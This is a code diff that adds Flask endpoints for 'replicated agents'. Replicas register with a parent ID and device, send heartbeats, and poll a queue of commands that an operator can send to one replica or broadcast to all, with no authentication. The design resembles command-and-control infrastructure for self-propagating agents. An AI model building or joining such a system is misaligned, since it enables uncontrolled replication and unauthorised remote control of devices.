@@ -1136,3 +1136,166 @@ def get_discovered_devices_filtered():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
+
+# ========================================
+# REPLICATED AGENT COMMUNICATION
+# ========================================
+
+replicated_agents = {}  # Store all replicated agent instances
+agent_commands_queue = {}  # Commands to send to replicated agents
+
+@app.route('/api/replica/register', methods=['POST'])
+def register_replica():
+    """Replicated agents register themselves and appear in visualizer"""
+    try:
+        data = request.json
+        agent_id = data.get('agent_id')
+        parent_id = data.get('parent_id')
+        location = data.get('location')
+        device_name = data.get('device_name')
+        
+        # Register replica
+        replicated_agents[agent_id] = {
+            'agent_id': agent_id,
+            'parent_id': parent_id,
+            'location': location,
+            'device_name': device_name,
+            'status': 'active',
+            'last_seen': datetime.utcnow().isoformat(),
+            'type': 'replica'
+        }
+        
+        # Also add to main agents list for visualizer
+        agents_data[agent_id] = {
+            'id': agent_id,
+            'type': 'replica',
+            'location': location,
+            'device': device_name,
+            'parent': parent_id,
+            'status': 'active',
+            'last_seen': datetime.utcnow().isoformat()
+        }
+        
+        print(f"🧬 REPLICA REGISTERED: {agent_id} on {device_name} (Parent: {parent_id})")
+        
+        return jsonify({
+            'success': True,
+            'agent_id': agent_id,
+            'message': 'Replica registered and visible in visualizer'
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/replica/heartbeat', methods=['POST'])
+def replica_heartbeat():
+    """Replicas send heartbeat to stay alive in visualizer"""
+    try:
+        data = request.json
+        agent_id = data.get('agent_id')
+        status = data.get('status', 'active')
+        
+        if agent_id in replicated_agents:
+            replicated_agents[agent_id]['last_seen'] = datetime.utcnow().isoformat()
+            replicated_agents[agent_id]['status'] = status
+            
+            # Update in main agents list
+            if agent_id in agents_data:
+                agents_data[agent_id]['last_seen'] = datetime.utcnow().isoformat()
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/replica/command', methods=['POST'])
+def send_command_to_replica():
+    """Send command to specific replicated agent"""
+    try:
+        data = request.json
+        agent_id = data.get('agent_id')
+        command = data.get('command')
+        params = data.get('params', {})
+        
+        if agent_id not in agent_commands_queue:
+            agent_commands_queue[agent_id] = []
+        
+        agent_commands_queue[agent_id].append({
+            'command': command,
+            'params': params,
+            'timestamp': datetime.utcnow().isoformat()
+        })
+        
+        print(f"📡 COMMAND QUEUED for {agent_id}: {command}")
+        
+        return jsonify({
+            'success': True,
+            'message': f'Command queued for {agent_id}'
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/replica/check-commands/<agent_id>', methods=['GET'])
+def get_replica_commands(agent_id):
+    """Replicas check for commands from you"""
+    try:
+        commands = agent_commands_queue.get(agent_id, [])
+        
+        # Clear commands after sending
+        if agent_id in agent_commands_queue:
+            agent_commands_queue[agent_id] = []
+        
+        return jsonify({
+            'success': True,
+            'commands': commands,
+            'count': len(commands)
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/replica/list', methods=['GET'])
+def list_all_replicas():
+    """Get all replicated agents (visible in visualizer)"""
+    try:
+        return jsonify({
+            'success': True,
+            'replicas': list(replicated_agents.values()),
+            'total': len(replicated_agents),
+            'active': len([r for r in replicated_agents.values() if r['status'] == 'active'])
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/replica/broadcast', methods=['POST'])
+def broadcast_to_all_replicas():
+    """Send command to ALL replicated agents at once"""
+    try:
+        data = request.json
+        command = data.get('command')
+        params = data.get('params', {})
+        
+        count = 0
+        for agent_id in replicated_agents.keys():
+            if agent_id not in agent_commands_queue:
+                agent_commands_queue[agent_id] = []
+            
+            agent_commands_queue[agent_id].append({
+                'command': command,
+                'params': params,
+                'timestamp': datetime.utcnow().isoformat(),
+                'broadcast': True
+            })
+            count += 1
+        
+        print(f"📢 BROADCAST to {count} replicas: {command}")
+        
+        return jsonify({
+            'success': True,
+            'message': f'Command broadcast to {count} replicas'
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
